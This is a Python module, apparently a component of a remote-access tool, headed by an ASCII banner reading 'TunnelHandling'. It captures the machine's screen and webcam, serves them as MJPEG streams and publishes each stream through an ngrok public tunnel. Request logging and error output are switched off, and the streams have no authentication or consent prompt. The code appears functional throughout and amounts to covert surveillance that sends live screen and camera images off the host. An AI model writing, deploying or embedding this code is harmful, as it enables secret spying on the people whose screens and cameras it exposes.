from io import BytesIO
from pyngrok import ngrok
from http.server import HTTPServer
from socketserver import ThreadingMixIn
from http.server import BaseHTTPRequestHandler, HTTPServer

#Misc
import numpy as np
from threading import Thread
from pyautogui import screenshot
from cv2 import cvtColor, resize, imencode, COLOR_BGR2RGB, VideoCapture


"""
ooooooooooooo                                               oooo  ooooo   ooooo                             .o8  oooo   o8o
8'   888   `8                                               `888  `888'   `888'                            "888  `888   `"'
     888      oooo  oooo  ooo. .oo.   ooo. .oo.    .ooooo.   888   888     888   .oooo.   ooo. .oo.    .oooo888   888  oooo  ooo. .oo.    .oooooooo
     888      `888  `888  `888P"Y88b  `888P"Y88b  d88' `88b  888   888ooooo888  `P  )88b  `888P"Y88b  d88' `888   888  `888  `888P"Y88b  888' `88b
     888       888   888   888   888   888   888  888ooo888  888   888     888   .oP"888   888   888  888   888   888   888   888   888  888   888
     888       888   888   888   888   888   888  888    .o  888   888     888  d8(  888   888   888  888   888   888   888   888   888  `88bod8P'
    o888o      `V88V"V8P' o888o o888o o888o o888o `Y8bod8P' o888o o888o   o888o `Y888""8o o888o o888o `Y8bod88P" o888o o888o o888o o888o `8oooooo.
                                                                                                                                         d"     YD
                                                                                                                                         "Y88888P'
"""
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    def handle_error(self, request, client_address):
        pass

class ScreenStreamHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path == '/':
            html = b"""\
            <!DOCTYPE html>
            <html>
            <head>
                <title>Screen Stream</title>
                <style>
                    body {
                        background-color: #1e1e1e;
                        color: #eee;
                        font-family: sans-serif;
                        text-align: center;
                        padding-top: 30px;
                    }
                    img {
                        border: 4px solid #444;
                        border-radius: 10px;
                        width: 80%%;
                        max-width: 900px;
                        box-shadow: 0 0 15px #000;
                    }
                </style>
            </head>
            <body>
                <h1>Live Screen Stream</h1>
                <img src="/video" alt="Screen stream">
            </body>
            </html>
            """
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-length', str(len(html)))
            self.end_headers()
            self.wfile.write(html)

        elif self.path == '/video':
            self.send_response(200)
            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
            self.end_headers()
            try:
                while True:
                    screenshot_out = screenshot()
                    with BytesIO() as output:
                        screenshot_out.save(output, format="JPEG")
                        frame = output.getvalue()
                    self.wfile.write(b"--frame\r\n")
                    self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + frame + b"\r\n")
            except (BrokenPipeError, ConnectionResetError):
                pass

        else:
            self.send_error(404)

def webcamandscreenstreamhandlermaker(cap):
    class WebcamAndScreenStreamHandler(BaseHTTPRequestHandler):
        def log_message(self, format, *args):
            pass

        def do_GET(self):
            if self.path == '/':
                html = b"""\
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Webcam&Screen Stream</title>
                    <style>
                        body {
                            background-color: #000;
                            color: #fff;
                            font-family: sans-serif;
                            text-align: center;
                            margin: 0;
                            padding: 2em;
                        }
                        img {
                            border: 6px solid #444;
                            border-radius: 12px;
                            width: 80%%;
                            max-width: 960px;
                            box-shadow: 0 0 20px #000;
                        }
                    </style>
                </head>
                <body>
                    <h1>Live Webcam&Screen Stream</h1>
                    <img src="/video" alt="Webcam stream">
                </body>
                </html>
                """
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Content-length', str(len(html)))
                self.end_headers()
                self.wfile.write(html)

            elif self.path == '/video':
                cap.open(0)
                self.send_response(200)
                self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
                self.end_headers()
                try:
                    while cap.isOpened():
                        img = screenshot()
                        img = np.array(img)
                        img = cvtColor(img, COLOR_BGR2RGB)
                        ret, frame = cap.read()
                        fr_height, fr_width, _ = frame.shape
                        frame = resize(frame, (fr_width//2, fr_height//2))
                        fr_height, fr_width, _ = frame.shape
                        img[0:fr_height, 0:fr_width, :] = frame[0:fr_height, 0:fr_width, :]
                        if not ret:
                            continue
                        _, jpeg = imencode('.jpg', img)
                        self.wfile.write(b"--frame\r\n")
                        self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + jpeg.tobytes() + b"\r\n")
                except (BrokenPipeError, ConnectionResetError):
                    pass
            else:
                self.send_error(404)
    return WebcamAndScreenStreamHandler

def webcamstreamhandlermaker(cap):
    class WebcamStreamHandler(BaseHTTPRequestHandler):
        def log_message(self, format, *args):
            pass

        def do_GET(self):
            if self.path == '/':
                html = b"""\
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Webcam Stream</title>
                    <style>
                        body {
                            background-color: #000;
                            color: #fff;
                            font-family: sans-serif;
                            text-align: center;
                            margin: 0;
                            padding: 2em;
                        }
                        img {
                            border: 6px solid #444;
                            border-radius: 12px;
                            width: 80%%;
                            max-width: 960px;
                            box-shadow: 0 0 20px #000;
                        }
                    </style>
                </head>
                <body>
                    <h1>Live Webcam Stream</h1>
                    <img src="/video" alt="Webcam stream">
                </body>
                </html>
                """
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Content-length', str(len(html)))
                self.end_headers()
                self.wfile.write(html)
            elif self.path == '/video':
                cap.open(0)
                self.send_response(200)
                self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
                self.end_headers()
                try:
                    while cap.isOpened():
                        ret, frame = cap.read()
                        if not ret:
                            continue
                        _, jpeg = imencode('.jpg', frame)
                        self.wfile.write(b"--frame\r\n")
                        self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + jpeg.tobytes() + b"\r\n")
                except (BrokenPipeError, ConnectionResetError):
                    pass
            else:
                self.send_error(404)
    return WebcamStreamHandler


class MJPEGServer:
    def __init__(self, port=8081, handler=None):
        self.port = port
        self.handler = handler
        self.server = None
        self.tunnel = None

    def start(self):
        self.server = ThreadedHTTPServer(('0.0.0.0', self.port), self.handler)
        Thread(target=self.server.serve_forever, daemon=True).start()
        self.tunnel = ngrok.connect(self.port, "http")
        return self.tunnel.public_url

    def stop(self):
        if self.tunnel:
            ngrok.disconnect(self.tunnel.public_url)
        if self.server:
            self.server.shutdown()
class TunnelManager:
    def __init__(self):
        self.services = {}

    def start_screen_stream(self, name="screen", port=8081):
        server = MJPEGServer(port, ScreenStreamHandler)
        url = server.start()
        self.services[name] = server
        return url

    def start_webcam_stream(self, name="webcam", port=8082, cap=VideoCapture(0)):
        server = MJPEGServer(port, webcamstreamhandlermaker(cap))
        url = server.start()
        self.services[name] = server
        return url

    def start_webcam_and_screen_stream(self, name="webcamandscreen", port=8023, cap=VideoCapture(0)):
        server = MJPEGServer(port, webcamandscreenstreamhandlermaker(cap))
        url = server.start()
        self.services[name] = server
        return url

    def stop_service(self, name):
        if name in self.services:
            self.services[name].stop()
            del self.services[name]
            return True
        return False

    def list_services(self):
        return list(self.services.keys())